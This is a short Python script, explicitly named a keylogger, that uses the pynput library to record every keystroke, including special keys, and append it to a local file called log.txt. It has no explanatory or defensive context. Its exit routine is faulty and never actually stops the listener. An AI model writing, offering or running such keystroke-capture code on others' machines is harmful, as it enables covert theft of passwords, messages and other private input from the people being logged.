import time
from pynput import keyboard

def keylogger():
    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = f"Special key {key}"
        with open("log.txt", "a") as f:
            f.write(f"{key_char}\n")
    def exit_program():
        print("Program will exit in 30 seconds.")
        time.sleep(30)
        return False
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        listener.stop()
    exit_program()

keylogger()

